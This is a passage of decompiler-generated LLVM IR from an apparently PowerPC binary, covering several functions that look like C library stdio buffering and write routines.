  store i32 %v3_10010860, i32* %r0.global-to-local, align 4
  %v1_10010864 = inttoptr i32 %v0_1001085c to i16*
  %v2_10010864 = load i16, i16* %v1_10010864, align 2
  %v2_10010868 = sub i32 %v3_10010860, %v3_1001085c
  store i32 %v2_10010868, i32* %r0.global-to-local, align 4
  %v5_10010868 = icmp eq i32 %v2_10010868, 0
  %v1_1001086c = or i16 %v2_10010864, 8
  store i16 %v1_1001086c, i16* %v1_10010864, align 2
  br i1 %v5_10010868, label %dec_label_pc_1001085c.dec_label_pc_100108c4_crit_edge, label %dec_label_pc_10010878

dec_label_pc_1001085c.dec_label_pc_100108c4_crit_edge: ; preds = %dec_label_pc_1001085c
  %v0_100108c4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100108c4

dec_label_pc_10010878:                            ; preds = %dec_label_pc_1001085c
  %v0_10010878 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010878 = load i32, i32* @r31, align 4
  %v3_10010878 = icmp ugt i32 %v0_10010878, %v1_10010878
  br i1 %v3_10010878, label %dec_label_pc_10010878.dec_label_pc_10010884_crit_edge, label %dec_label_pc_10010880

dec_label_pc_10010878.dec_label_pc_10010884_crit_edge: ; preds = %dec_label_pc_10010878
  %v0_10010884.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10010884

dec_label_pc_10010880:                            ; preds = %dec_label_pc_10010878
  store i32 %v0_10010878, i32* @r27, align 4
  br label %dec_label_pc_10010884

dec_label_pc_10010884:                            ; preds = %dec_label_pc_10010878.dec_label_pc_10010884_crit_edge, %dec_label_pc_10010880
  %v0_10010884 = phi i32 [ %v0_10010884.pre, %dec_label_pc_10010878.dec_label_pc_10010884_crit_edge ], [ %v0_10010878, %dec_label_pc_10010880 ]
  store i32 %v0_10010884, i32* %ctr.global-to-local, align 4
  %v2_10010890.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10010888

dec_label_pc_10010888:                            ; preds = %dec_label_pc_100108ac, %dec_label_pc_10010884
  %v2_10010890 = phi i32 [ %v1_100108ac, %dec_label_pc_100108ac ], [ %v2_10010890.pre, %dec_label_pc_10010884 ]
  %v0_10010888 = load i32, i32* @r29, align 4
  %v1_10010888 = inttoptr i32 %v0_10010888 to i8*
  %v2_10010888 = load i8, i8* %v1_10010888, align 1
  %v3_10010888 = zext i8 %v2_10010888 to i32
  store i32 %v3_10010888, i32* %r0.global-to-local, align 4
  %v1_1001088c = add i32 %v0_10010888, 1
  store i32 %v1_1001088c, i32* @r29, align 4
  %v3_10010890 = inttoptr i32 %v2_10010890 to i8*
  store i8 %v2_10010888, i8* %v3_10010890, align 1
  %v0_10010894 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010894 = urem i32 %v0_10010894, 256
  store i32 %v1_10010894, i32* %r0.global-to-local, align 4
  %v3_10010898 = icmp eq i32 %v1_10010894, 10
  br i1 %v3_10010898, label %dec_label_pc_100108a0, label %dec_label_pc_100108ac

dec_label_pc_100108a0:                            ; preds = %dec_label_pc_10010888
  %v0_100108a0 = load i32, i32* @r30, align 4
  %v1_100108a0 = inttoptr i32 %v0_100108a0 to i16*
  %v2_100108a0 = load i16, i16* %v1_100108a0, align 2
  %v3_100108a0 = zext i16 %v2_100108a0 to i32
  store i32 %v3_100108a0, i32* %r0.global-to-local, align 4
  %v1_100108a4 = and i32 %v3_100108a0, 256
  %v3_100108a4 = icmp eq i32 %v1_100108a4, 0
  br i1 %v3_100108a4, label %dec_label_pc_100108ac, label %dec_label_pc_100108a0.dec_label_pc_100108b4_crit_edge

dec_label_pc_100108a0.dec_label_pc_100108b4_crit_edge: ; preds = %dec_label_pc_100108a0
  %v0_100108b8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100108b4

dec_label_pc_100108ac:                            ; preds = %dec_label_pc_100108a0, %dec_label_pc_10010888
  %v0_100108ac = load i32, i32* %r11.global-to-local, align 4
  %v1_100108ac = add i32 %v0_100108ac, 1
  store i32 %v1_100108ac, i32* %r11.global-to-local, align 4
  %v0_100108b0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100108b0 = add i32 %v0_100108b0, -1
  store i32 %v1_100108b0, i32* %ctr.global-to-local, align 4
  %v2_100108b0 = icmp eq i32 %v1_100108b0, 0
  br i1 %v2_100108b0, label %dec_label_pc_100108ac.dec_label_pc_100108b4_crit_edge, label %dec_label_pc_10010888

dec_label_pc_100108ac.dec_label_pc_100108b4_crit_edge: ; preds = %dec_label_pc_100108ac
  %v0_100108b4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100108b4

dec_label_pc_100108b4:                            ; preds = %dec_label_pc_100108a0.dec_label_pc_100108b4_crit_edge, %dec_label_pc_100108ac.dec_label_pc_100108b4_crit_edge
  %v0_100108b8 = phi i32 [ %v1_100108ac, %dec_label_pc_100108ac.dec_label_pc_100108b4_crit_edge ], [ %v0_100108b8.pre, %dec_label_pc_100108a0.dec_label_pc_100108b4_crit_edge ]
  %v0_100108b4 = phi i32 [ %v0_100108b4.pre, %dec_label_pc_100108ac.dec_label_pc_100108b4_crit_edge ], [ %v0_100108a0, %dec_label_pc_100108a0.dec_label_pc_100108b4_crit_edge ]
  %v1_100108b4 = add i32 %v0_100108b4, 8
  %v2_100108b4 = inttoptr i32 %v1_100108b4 to i32*
  %v3_100108b4 = load i32, i32* %v2_100108b4, align 4
  store i32 %v3_100108b4, i32* %r0.global-to-local, align 4
  %v2_100108b8 = add i32 %v0_100108b4, 16
  %v3_100108b8 = inttoptr i32 %v2_100108b8 to i32*
  store i32 %v0_100108b8, i32* %v3_100108b8, align 4
  %v0_100108bc = load i32, i32* %r0.global-to-local, align 4
  %v1_100108bc = load i32, i32* %r11.global-to-local, align 4
  %v2_100108bc = sub i32 %v1_100108bc, %v0_100108bc
  store i32 %v2_100108bc, i32* %r0.global-to-local, align 4
  %v1_100108c0 = load i32, i32* @r31, align 4
  %v2_100108c0 = sub i32 %v1_100108c0, %v2_100108bc
  store i32 %v2_100108c0, i32* @r31, align 4
  br label %dec_label_pc_100108c4

dec_label_pc_100108c4:                            ; preds = %dec_label_pc_1001085c.dec_label_pc_100108c4_crit_edge, %dec_label_pc_100108b4
  %v0_100108c4 = phi i32 [ %v0_100108c4.pre, %dec_label_pc_1001085c.dec_label_pc_100108c4_crit_edge ], [ %v2_100108c0, %dec_label_pc_100108b4 ]
  %v1_100108c4 = load i32, i32* @r28, align 4
  %v2_100108c4 = sub i32 %v1_100108c4, %v0_100108c4
  store i32 %v2_100108c4, i32* @r28, align 4
  br label %dec_label_pc_100108c8

dec_label_pc_10010820.dec_label_pc_100108c8.loopexit_crit_edge: ; preds = %dec_label_pc_10010850
  %v0_100108cc.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_100108c8

dec_label_pc_100108c8:                            ; preds = %dec_label_pc_10010800, %dec_label_pc_10010820.dec_label_pc_100108c8.loopexit_crit_edge, %dec_label_pc_100108c4
  %v0_100108cc = phi i32 [ %v2_100108c4, %dec_label_pc_100108c4 ], [ %v0_100108cc.pre.pre, %dec_label_pc_10010820.dec_label_pc_100108c8.loopexit_crit_edge ], [ 0, %dec_label_pc_10010800 ]
  store i32 %v0_10010804, i32* %r0.global-to-local, align 4
  ret i32 %v0_100108cc

; uselistorder directives
  uselistorder i32 %v0_100108b4, { 1, 0 }
  uselistorder i32 %v1_100108b0, { 1, 0 }
  uselistorder i32 %v1_100108ac, { 0, 2, 1 }
  uselistorder i32 %v1_10010894, { 1, 0 }
  uselistorder i32 %v2_10010854, { 3, 2, 1, 0 }
  uselistorder i32 %v2_10010850, { 1, 0 }
  uselistorder i32 %v3_10010844, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 (i32, i32)* @function_1000c7dc, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_100108c8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100108c4, { 1, 0 }
  uselistorder label %dec_label_pc_100108b4, { 1, 0 }
  uselistorder label %dec_label_pc_10010884, { 1, 0 }
  uselistorder label %dec_label_pc_1001083c, { 1, 0 }
  uselistorder label %dec_label_pc_1001082c, { 1, 0 }
}

define i32 @function_100108e0(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
dec_label_pc_100108e0:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_100108e4 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_100108fc = load i16, i16* %arg3, align 2
  %v1_10010900 = and i16 %v3_100108fc, 512
  %v3_10010900 = icmp eq i16 %v1_10010900, 0
  br i1 %v3_10010900, label %dec_label_pc_10010908, label %dec_label_pc_10010a14

dec_label_pc_10010908:                            ; preds = %dec_label_pc_100108e0
  %v2_10010908 = add i32 %tmp, 4
  %v3_10010908 = inttoptr i32 %v2_10010908 to i32*
  %v4_10010908 = load i32, i32* %v3_10010908, align 4
  %v2_1001090c = add i32 %tmp, 16
  %v3_1001090c = inttoptr i32 %v2_1001090c to i32*
  %v4_1001090c = load i32, i32* %v3_1001090c, align 4
  store i32 %v4_1001090c, i32* @r3, align 4
  %v2_10010910 = add i32 %tmp, 12
  %v3_10010910 = inttoptr i32 %v2_10010910 to i32*
  %v4_10010910 = load i32, i32* %v3_10010910, align 4
  %v3_10010914 = icmp eq i32 %v4_10010908, -2
  %v2_1001091c = sub i32 %v4_10010910, %v4_1001090c
  br i1 %v3_10010914, label %dec_label_pc_1001091c, label %dec_label_pc_1001094c

dec_label_pc_1001091c:                            ; preds = %dec_label_pc_10010908
  %v3_10010924 = icmp ult i32 %v2_1001091c, %arg2
  br i1 %v3_10010924, label %dec_label_pc_1001092c, label %dec_label_pc_10010930

dec_label_pc_1001092c:                            ; preds = %dec_label_pc_1001091c
  br label %dec_label_pc_10010930

dec_label_pc_10010930:                            ; preds = %dec_label_pc_1001091c, %dec_label_pc_1001092c
  %storemerge = phi i32 [ %v2_1001091c, %dec_label_pc_1001092c ], [ %arg2, %dec_label_pc_1001091c ]
  %v0_10010934 = phi i32 [ %v2_1001091c, %dec_label_pc_1001092c ], [ %arg2, %dec_label_pc_1001091c ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_10010934, i32* @r5, align 4
  store i32 268503356, i32* @lr, align 4
  %v0_10010938 = call i32 @function_1000dcb0()
  %v0_1001093c = load i32, i32* @r30, align 4
  %v1_1001093c = add i32 %v0_1001093c, 16
  %v2_1001093c = inttoptr i32 %v1_1001093c to i32*
  %v3_1001093c = load i32, i32* %v2_1001093c, align 4
  %v1_10010940 = load i32, i32* @r31, align 4
  %v2_10010940 = add i32 %v1_10010940, %v3_1001093c
  store i32 %v2_10010940, i32* %v2_1001093c, align 4
  br label %dec_label_pc_10010a34

dec_label_pc_1001094c:                            ; preds = %dec_label_pc_10010908
  %v3_10010950 = icmp ult i32 %v2_1001091c, %arg2
  br i1 %v3_10010950, label %dec_label_pc_100109f0, label %dec_label_pc_10010958

dec_label_pc_10010958:                            ; preds = %dec_label_pc_1001094c
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268503396, i32* @lr, align 4
  %v0_10010960 = call i32 @function_1000dcb0()
  %v0_10010964 = load i32, i32* @r30, align 4
  %v1_10010964 = inttoptr i32 %v0_10010964 to i16*
  %v2_10010964 = load i16, i16* %v1_10010964, align 2
  %v1_10010968 = add i32 %v0_10010964, 16
  %v2_10010968 = inttoptr i32 %v1_10010968 to i32*
  %v3_10010968 = load i32, i32* %v2_10010968, align 4
  %v1_1001096c = and i16 %v2_10010964, 256
  %v3_1001096c = icmp eq i16 %v1_1001096c, 0
  %v1_10010970 = load i32, i32* @r29, align 4
  %v2_10010970 = add i32 %v1_10010970, %v3_10010968
  store i32 %v2_10010970, i32* %v2_10010968, align 4
  br i1 %v3_1001096c, label %dec_label_pc_10010a34, label %dec_label_pc_1001097c

dec_label_pc_1001097c:                            ; preds = %dec_label_pc_10010958
  %v0_1001097c = load i32, i32* @r28, align 4
  %v0_10010984 = load i32, i32* @r29, align 4
  store i32 268503436, i32* @lr, align 4
  %v4_10010988 = call i32 @function_10011650(i32 %v0_1001097c, i32 10, i32 %v0_10010984, i32 %v2_10010970)
  %v3_1001098c = icmp eq i32 %v4_10010988, 0
  br i1 %v3_1001098c, label %dec_label_pc_10010a34, label %dec_label_pc_10010994

dec_label_pc_10010994:                            ; preds = %dec_label_pc_1001097c
  %v0_10010994 = load i32, i32* @r30, align 4
  store i32 %v0_10010994, i32* @r3, align 4
  store i32 268503452, i32* @lr, align 4
  %v0_10010998 = call i32 @function_1000cb04()
  %v3_1001099c = icmp eq i32 %v0_10010998, 0
  br i1 %v3_1001099c, label %dec_label_pc_10010a34, label %dec_label_pc_100109a4

dec_label_pc_100109a4:                            ; preds = %dec_label_pc_10010994
  %v0_100109a4 = load i32, i32* @r29, align 4
  %v3_100109a4 = icmp ugt i32 %v0_100109a4, %v0_10010998
  %v0_10010998.v0_100109a8 = select i1 %v3_100109a4, i32 %v0_10010998, i32 %v0_100109a4
  store i32 %v0_10010998.v0_100109a8, i32* @r31, align 4
  %v2_100109b4 = sub i32 %v0_100109a4, %v0_10010998.v0_100109a8
  %v0_100109bc = load i32, i32* @r28, align 4
  %v2_100109bc = add i32 %v0_100109bc, %v2_100109b4
  store i32 %v2_100109bc, i32* @r28, align 4
  store i32 %v2_100109bc, i32* @r3, align 4
  store i32 268503500, i32* @lr, align 4
  %v3_100109c8 = call i32 @function_10011514(i32 %v2_100109bc, i32 10, i32 %v0_10010998.v0_100109a8)
  %v3_100109cc = icmp eq i32 %v3_100109c8, 0
  br i1 %v3_100109cc, label %dec_label_pc_10010a34, label %dec_label_pc_100109d4

dec_label_pc_100109d4:                            ; preds = %dec_label_pc_100109a4
  %v0_100109d4 = load i32, i32* @r30, align 4
  %v1_100109d4 = add i32 %v0_100109d4, 16
  %v2_100109d4 = inttoptr i32 %v1_100109d4 to i32*
  %v3_100109d4 = load i32, i32* %v2_100109d4, align 4
  %v0_100109d8 = load i32, i32* @r28, align 4
  %v1_100109d8 = load i32, i32* @r31, align 4
  %v2_100109d8 = sub i32 %v0_100109d8, %v3_100109c8
  %v2_100109dc = add i32 %v2_100109d8, %v1_100109d8
  %v1_100109e0 = load i32, i32* @r29, align 4
  %v2_100109e0 = sub i32 %v1_100109e0, %v2_100109dc
  store i32 %v2_100109e0, i32* @r29, align 4
  %v2_100109e4 = sub i32 %v3_100109d4, %v2_100109dc
  store i32 %v2_100109e4, i32* %v2_100109d4, align 4
  br label %dec_label_pc_10010a34

dec_label_pc_100109f0:                            ; preds = %dec_label_pc_1001094c
  %v2_100109f0 = add i32 %tmp, 8
  %v3_100109f0 = inttoptr i32 %v2_100109f0 to i32*
  %v4_100109f0 = load i32, i32* %v3_100109f0, align 4
  %v4_100109f4 = icmp eq i32 %v4_1001090c, %v4_100109f0
  br i1 %v4_100109f4, label %dec_label_pc_10010a14, label %dec_label_pc_100109fc

dec_label_pc_100109fc:                            ; preds = %dec_label_pc_100109f0
  store i32 %tmp, i32* @r3, align 4
  store i32 268503556, i32* @lr, align 4
  %v0_10010a00 = call i32 @function_1000cb04()
  %v3_10010a04 = icmp eq i32 %v0_10010a00, 0
  br i1 %v3_10010a04, label %dec_label_pc_100109fc.dec_label_pc_10010a14_crit_edge, label %dec_label_pc_10010a0c

dec_label_pc_100109fc.dec_label_pc_10010a14_crit_edge: ; preds = %dec_label_pc_100109fc
  %v0_10010a18.pre = load i32, i32* @r30, align 4
  %v0_10010a1c.pre = load i32, i32* @r28, align 4
  %v0_10010a20.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10010a14

dec_label_pc_10010a0c:                            ; preds = %dec_label_pc_100109fc
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10010a34

dec_label_pc_10010a14:                            ; preds = %dec_label_pc_100109fc.dec_label_pc_10010a14_crit_edge, %dec_label_pc_100108e0, %dec_label_pc_100109f0
  %v0_10010a20 = phi i32 [ %v0_10010a20.pre, %dec_label_pc_100109fc.dec_label_pc_10010a14_crit_edge ], [ %arg2, %dec_label_pc_100108e0 ], [ %arg2, %dec_label_pc_100109f0 ]
  %v0_10010a1c = phi i32 [ %v0_10010a1c.pre, %dec_label_pc_100109fc.dec_label_pc_10010a14_crit_edge ], [ %arg1, %dec_label_pc_100108e0 ], [ %arg1, %dec_label_pc_100109f0 ]
  %v0_10010a18 = phi i32 [ %v0_10010a18.pre, %dec_label_pc_100109fc.dec_label_pc_10010a14_crit_edge ], [ %tmp, %dec_label_pc_100108e0 ], [ %tmp, %dec_label_pc_100109f0 ]
  %v1_10010a18 = inttoptr i32 %v0_10010a18 to i16*
  store i32 %v0_10010a20, i32* @r5, align 4
  store i32 %v0_100108e4, i32* @lr, align 4
  %v5_10010a30 = call i32 @function_10010800(i16* %v1_10010a18, i32 %v0_10010a1c)
  br label %dec_label_pc_10010a34

dec_label_pc_10010a34:                            ; preds = %dec_label_pc_100109a4, %dec_label_pc_10010994, %dec_label_pc_1001097c, %dec_label_pc_10010958, %dec_label_pc_10010a0c, %dec_label_pc_100109d4, %dec_label_pc_10010930, %dec_label_pc_10010a14
  %v0_10010a38 = load i32, i32* @r29, align 4
  ret i32 %v0_10010a38

; uselistorder directives
  uselistorder i32 %v2_100109dc, { 1, 0 }
  uselistorder i32 %v0_10010998.v0_100109a8, { 0, 2, 1 }
  uselistorder i32 %v0_100109a4, { 1, 0, 2 }
  uselistorder i32 %v2_1001091c, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_10010a34, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_10010a14, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10010930, { 1, 0 }
}

define i32 @function_10010a4c() local_unnamed_addr {
dec_label_pc_10010a4c:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10010a50 = load i32, i32* @lr, align 4
  store i32 %v0_10010a50, i32* %r0.global-to-local, align 4
  %v0_10010a54 = load i32, i32* @r31, align 4
  %v0_10010a58 = load i32, i32* @r3, align 4
  store i32 %v0_10010a58, i32* @r31, align 4
  %v1_10010a60 = inttoptr i32 %v0_10010a58 to i16*
  %v2_10010a60 = load i16, i16* %v1_10010a60, align 2
  %v3_10010a60 = zext i16 %v2_10010a60 to i32
  store i32 %v3_10010a60, i32* %r0.global-to-local, align 4
  %v1_10010a64 = load i32, i32* @r4, align 4
  %v2_10010a64 = and i32 %v1_10010a64, %v3_10010a60
  store i32 %v2_10010a64, i32* %r9.global-to-local, align 4
  %v5_10010a64 = icmp eq i32 %v2_10010a64, 0
  br i1 %v5_10010a64, label %dec_label_pc_10010a6c, label %dec_label_pc_10010a7c

dec_label_pc_10010a6c:                            ; preds = %dec_label_pc_10010a4c
  %v1_10010a6c = and i32 %v3_10010a60, 2176
  store i32 %v1_10010a6c, i32* %r9.global-to-local, align 4
  %v3_10010a6c = icmp eq i32 %v1_10010a6c, 0
  br i1 %v3_10010a6c, label %dec_label_pc_10010a74, label %dec_label_pc_10010a88

dec_label_pc_10010a74:                            ; preds = %dec_label_pc_10010a6c
  %v2_10010a74 = or i32 %v1_10010a64, %v3_10010a60
  store i32 %v2_10010a74, i32* %r0.global-to-local, align 4
  %v1_10010a78 = trunc i32 %v2_10010a74 to i16
  store i16 %v1_10010a78, i16* %v1_10010a60, align 2
  %v0_10010a7c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10010a7c

dec_label_pc_10010a7c:                            ; preds = %dec_label_pc_10010a4c, %dec_label_pc_10010a74
  %v0_10010ab8 = phi i32 [ %v0_10010a58, %dec_label_pc_10010a4c ], [ %v0_10010a7c.pre, %dec_label_pc_10010a74 ]
  %v1_10010a7c = inttoptr i32 %v0_10010ab8 to i16*
  %v2_10010a7c = load i16, i16* %v1_10010a7c, align 2
  %v3_10010a7c = zext i16 %v2_10010a7c to i32
  %v1_10010a80 = and i32 %v3_10010a7c, 32
  store i32 %v1_10010a80, i32* %r0.global-to-local, align 4
  %v3_10010a80 = icmp eq i32 %v1_10010a80, 0
  br i1 %v3_10010a80, label %dec_label_pc_10010aa8, label %dec_label_pc_10010a88

dec_label_pc_10010a88:                            ; preds = %dec_label_pc_10010a6c, %dec_label_pc_10010a7c
  %v0_10010a88 = call i32 @function_1000c85c()
  store i32 %v0_10010a88, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_10010a90 = inttoptr i32 %v0_10010a88 to i32*
  store i32 9, i32* %v2_10010a90, align 4
  br label %dec_label_pc_10010a94

dec_label_pc_10010a94:                            ; preds = %dec_label_pc_10010ad0, %dec_label_pc_10010a88
  %v0_10010a94 = load i32, i32* @r31, align 4
  %v1_10010a94 = inttoptr i32 %v0_10010a94 to i16*
  %v2_10010a94 = load i16, i16* %v1_10010a94, align 2
  %v3_10010a94 = zext i16 %v2_10010a94 to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10010a9c = or i32 %v3_10010a94, 8
  store i32 %v1_10010a9c, i32* %r0.global-to-local, align 4
  %v1_10010aa0 = trunc i32 %v1_10010a9c to i16
  store i16 %v1_10010aa0, i16* %v1_10010a94, align 2
  br label %dec_label_pc_10010b30

dec_label_pc_10010aa8:                            ; preds = %dec_label_pc_10010a7c
  %tmp = urem i16 %v2_10010a7c, 4
  %v1_10010aa8 = zext i16 %tmp to i32
  store i32 %v1_10010aa8, i32* %r0.global-to-local, align 4
  %v3_10010aa8 = icmp eq i16 %tmp, 0
  br i1 %v3_10010aa8, label %dec_label_pc_10010b0c, label %dec_label_pc_10010ab0

dec_label_pc_10010ab0:                            ; preds = %dec_label_pc_10010aa8
  %v1_10010ab0 = and i32 %v3_10010a7c, 4
  store i32 %v1_10010ab0, i32* %r9.global-to-local, align 4
  %v3_10010ab0 = icmp eq i32 %v1_10010ab0, 0
  br i1 %v3_10010ab0, label %dec_label_pc_10010ab8, label %dec_label_pc_10010af0

dec_label_pc_10010ab8:                            ; preds = %dec_label_pc_10010ab0
  %v1_10010ab8 = add i32 %v0_10010ab8, 20
  %v2_10010ab8 = inttoptr i32 %v1_10010ab8 to i32*
  %v3_10010ab8 = load i32, i32* %v2_10010ab8, align 4
  store i32 %v3_10010ab8, i32* %r0.global-to-local, align 4
  %v1_10010abc = add i32 %v0_10010ab8, 16
  %v2_10010abc = inttoptr i32 %v1_10010abc to i32*
  %v3_10010abc = load i32, i32* %v2_10010abc, align 4
  store i32 %v3_10010abc, i32* %r9.global-to-local, align 4
  %v4_10010ac0 = icmp eq i32 %v3_10010ab8, %v3_10010abc
  br i1 %v4_10010ac0, label %dec_label_pc_10010ac8, label %dec_label_pc_10010ad0

dec_label_pc_10010ac8:                            ; preds = %dec_label_pc_10010ab8
  %v1_10010ac8 = and i32 %v3_10010a7c, 2
  store i32 %v1_10010ac8, i32* %r0.global-to-local, align 4
  %v3_10010ac8 = icmp eq i32 %v1_10010ac8, 0
  br i1 %v3_10010ac8, label %dec_label_pc_10010af0, label %dec_label_pc_10010ad0

dec_label_pc_10010ad0:                            ; preds = %dec_label_pc_10010ab8, %dec_label_pc_10010ac8
  %v1_10010ad0 = and i32 %v3_10010a7c, 1024
  store i32 %v1_10010ad0, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v0_10010ad8 = call i32 @__asm_mfcr()
  store i32 %v0_10010ad8, i32* %r3.global-to-local, align 4
  %v1_10010adc = call i32 @__asm_rlwinm(i32 %v0_10010ad8, i32 3, i32 31, i32 31)
  %v1_10010ae0 = sub i32 2, %v1_10010adc
  store i32 %v1_10010ae0, i32* @r5, align 4
  store i32 268503784, i32* @lr, align 4
  %v1_10010ae4 = inttoptr i32 %v1_10010ae0 to i16*
  %v2_10010ae4 = call i32 @function_100126f4(i16* %v1_10010ae4)
  store i32 %v2_10010ae4, i32* %r3.global-to-local, align 4
  %v3_10010ae8 = icmp eq i32 %v2_10010ae4, 0
  br i1 %v3_10010ae8, label %dec_label_pc_10010ad0.dec_label_pc_10010af0_crit_edge, label %dec_label_pc_10010a94

dec_label_pc_10010ad0.dec_label_pc_10010af0_crit_edge: ; preds = %dec_label_pc_10010ad0
  %v0_10010af0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10010af0

dec_label_pc_10010af0:                            ; preds = %dec_label_pc_10010ad0.dec_label_pc_10010af0_crit_edge, %dec_label_pc_10010ab0, %dec_label_pc_10010ac8
  %v0_10010af0 = phi i32 [ %v0_10010af0.pre, %dec_label_pc_10010ad0.dec_label_pc_10010af0_crit_edge ], [ %v0_10010ab8, %dec_label_pc_10010ab0 ], [ %v0_10010ab8, %dec_label_pc_10010ac8 ]
  %v1_10010af0 = inttoptr i32 %v0_10010af0 to i16*
  %v2_10010af0 = load i16, i16* %v1_10010af0, align 2
  %v3_10010af0 = zext i16 %v2_10010af0 to i32
  store i32 %v3_10010af0, i32* %r0.global-to-local, align 4
  %v1_10010af4 = add i32 %v0_10010af0, 8
  %v2_10010af4 = inttoptr i32 %v1_10010af4 to i32*
  %v3_10010af4 = load i32, i32* %v2_10010af4, align 4
  store i32 %v3_10010af4, i32* %r9.global-to-local, align 4
  %v1_10010af8 = call i32 @__asm_rlwinm(i32 %v3_10010af0, i32 0, i32 0, i32 29)
  %v2_10010af8 = trunc i32 %v1_10010af8 to i16
  store i32 %v1_10010af8, i32* %r0.global-to-local, align 4
  %v3_10010afc = load i32, i32* @r31, align 4
  %v4_10010afc = inttoptr i32 %v3_10010afc to i16*
  store i16 %v2_10010af8, i16* %v4_10010afc, align 2
  %v0_10010b00 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010b00 = load i32, i32* @r31, align 4
  %v2_10010b00 = add i32 %v1_10010b00, 20
  %v3_10010b00 = inttoptr i32 %v2_10010b00 to i32*
  store i32 %v0_10010b00, i32* %v3_10010b00, align 4
  %v0_10010b04 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010b04 = load i32, i32* @r31, align 4
  %v2_10010b04 = add i32 %v1_10010b04, 24
  %v3_10010b04 = inttoptr i32 %v2_10010b04 to i32*
  store i32 %v0_10010b04, i32* %v3_10010b04, align 4
  %v0_10010b08 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010b08 = load i32, i32* @r31, align 4
  %v2_10010b08 = add i32 %v1_10010b08, 16
  %v3_10010b08 = inttoptr i32 %v2_10010b08 to i32*
  store i32 %v0_10010b08, i32* %v3_10010b08, align 4
  %v0_10010b0c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10010b0c

dec_label_pc_10010b0c:                            ; preds = %dec_label_pc_10010aa8, %dec_label_pc_10010af0
  %v2_10010b18 = phi i32 [ %v0_10010ab8, %dec_label_pc_10010aa8 ], [ %v0_10010b0c.pre, %dec_label_pc_10010af0 ]
  %v1_10010b0c = inttoptr i32 %v2_10010b18 to i16*
  %v2_10010b0c = load i16, i16* %v1_10010b0c, align 2
  %v3_10010b0c = zext i16 %v2_10010b0c to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10010b14 = or i32 %v3_10010b0c, 64
  store i32 %v1_10010b14, i32* %r0.global-to-local, align 4
  %v1_10010b18 = trunc i32 %v1_10010b14 to i16
  store i16 %v1_10010b18, i16* %v1_10010b0c, align 2
  %v0_10010b1c = load i32, i32* %r0.global-to-local, align 4
  %v1_10010b1c = urem i32 %v0_10010b1c, 65536
  store i32 %v1_10010b1c, i32* %r0.global-to-local, align 4
  %v1_10010b20 = and i32 %v0_10010b1c, 2816
  store i32 %v1_10010b20, i32* %r9.global-to-local, align 4
  %v3_10010b20 = icmp eq i32 %v1_10010b20, 0
  br i1 %v3_10010b20, label %dec_label_pc_10010b28, label %dec_label_pc_10010b30

dec_label_pc_10010b28:                            ; preds = %dec_label_pc_10010b0c
  %v0_10010b28 = load i32, i32* @r31, align 4
  %v1_10010b28 = add i32 %v0_10010b28, 12
  %v2_10010b28 = inttoptr i32 %v1_10010b28 to i32*
  %v3_10010b28 = load i32, i32* %v2_10010b28, align 4
  store i32 %v3_10010b28, i32* %r0.global-to-local, align 4
  %v2_10010b2c = add i32 %v0_10010b28, 28
  %v3_10010b2c = inttoptr i32 %v2_10010b2c to i32*
  store i32 %v3_10010b28, i32* %v3_10010b2c, align 4
  br label %dec_label_pc_10010b30

dec_label_pc_10010b30:                            ; preds = %dec_label_pc_10010b0c, %dec_label_pc_10010a94, %dec_label_pc_10010b28
  store i32 %v0_10010a50, i32* %r0.global-to-local, align 4
  store i32 %v0_10010a54, i32* @r31, align 4
  %v0_10010b40 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10010b40

; uselistorder directives
  uselistorder i32 %v0_10010b1c, { 1, 0 }
  uselistorder i32 %v1_10010af8, { 1, 0 }
  uselistorder i32 %v0_10010af0, { 1, 0 }
  uselistorder i32 %v0_10010ab8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v3_10010a60, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_10010b30, { 2, 0, 1 }
